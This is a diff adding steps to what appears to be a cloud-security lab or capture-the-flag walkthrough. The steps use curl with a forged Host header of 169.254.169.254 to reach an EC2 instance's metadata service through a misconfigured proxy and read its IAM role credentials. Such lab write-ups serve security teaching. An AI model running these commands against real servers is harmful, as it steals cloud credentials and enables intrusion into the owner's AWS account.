@@ -762,3 +762,51 @@ nc <ip address> 22
 <p align="center">
   <img src="/images/cloud/ssh_version.png">
 </p>
+
+* Tried opening the IP Address in web browser, it didn't respond.
+
+<p align="center">
+  <img src="/images/cloud/web_browser.png">
+</p>
+
+* cURL to the IP Address via CLI.
+
+```bash
+curl http://ipaddress
+```
+
+<p align="center">
+  <img src="/images/cloud/curl_breach.png">
+</p>
+
+Note: It was observed that the server is configured to EC2 metadata service, so we need to set the **Host: 169.254.169.254** and resend the request.
+
+* Replay the cURL request by setting **Host** value with EC2 metadata.
+
+```bash
+curl http://ipaddress -H 'Host: 169.254.169.254'
+```
+
+<p align="center">
+  <img src="/images/cloud/ec2_metadata.png">
+</p>
+
+* Use the following command to reveal the **IAM** Role information.
+
+```bash
+curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
+```
+
+<p align="center">
+  <img src="/images/cloud/ec2_iam_leak.png">
+</p>
+
+* Extract more information about the **IAM** Role.
+
+```bash
+curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
+```
+
+<p align="center">
+  <img src="/images/cloud/aws_leaked_credentials.png">
+</p>
